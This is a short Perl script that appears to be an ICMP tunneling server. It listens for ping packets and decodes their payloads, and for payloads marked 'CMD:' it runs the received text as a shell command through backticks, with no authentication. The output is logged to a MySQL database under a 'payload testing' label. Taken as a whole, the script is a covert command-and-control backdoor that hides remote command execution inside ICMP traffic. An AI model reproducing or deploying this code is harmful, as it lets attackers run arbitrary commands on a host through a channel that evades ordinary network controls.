#!/usr/bin/perl
use Net::Ping;
use DBI;

# Created by Haroon Ahmad Awan

# Database configuration
my $db_host = 'localhost';
my $db_name = 'icmp_tunneling';
my $db_user = 'your_db_user';
my $db_pass = 'your_db_password';

# Create a ping object
my $ping = Net::Ping->new("icmp");

$SIG{INT} = sub {
    $ping->close();
    print "Server shutting down.\n";
    exit(0);
};

# Connect to the MySQL database
my $dbh = DBI->connect("DBI:mysql:$db_name;host=$db_host", $db_user, $db_pass, { RaiseError => 1 });

sub log_test {
    my ($test_name, $result, $details) = @_;
    print "Test: $test_name - $result\n";
    my $stmt = $dbh->prepare("INSERT INTO test_log (test_name, result, details) VALUES (?, ?, ?)");
    $stmt->execute($test_name, $result, $details);
}

log_test("Advanced Payload Testing", "Started", "Testing complex payloads.");

while (1) {
    my ($ret, $duration, $ip, $data) = $ping->icmp_receive(-1);
    if ($ret) {
        if ($data =~ /ICMP-(.+)/) {
            my $payload = $1;

            if ($payload =~ /^HEX:(.+)/) {
                my $hex_data = $1;
                my $decoded_data = pack('H*', $hex_data);
                log_test("Hexadecimal Payload Received", "Success", "Hexadecimal data: $hex_data");
                print "Received ICMP packet with hexadecimal payload: $hex_data\n";
                print "Decoded payload: $decoded_data\n";
            } elsif ($payload =~ /^CMD:(.+)/) {
                my $command = $1;
                my $output = `$command`;
                log_test("Command Payload Received", "Success", "Command: $command\nCommand output:\n$output");
                print "Received ICMP packet with command payload: $command\n";
                print "Command output:\n$output\n";
            } elsif ($payload =~ /^DANGEROUS:(.+)/) {
                my $dangerous_payload = $1;
                log_test("Dangerous Payload Received", "Success", "Payload content: $dangerous_payload");
                print "Received ICMP packet with dangerous payload:\n$dangerous_payload\n";
                print "This payload is potentially dangerous and requires caution.\n";
            } else {
                my $data_received = $payload;
                log_test("Text Payload Received", "Success", "Received data: $data_received");
                print "Received ICMP packet with data: $data_received\n";
            }
        }
    }
}

$ping->close();
$dbh->disconnect();
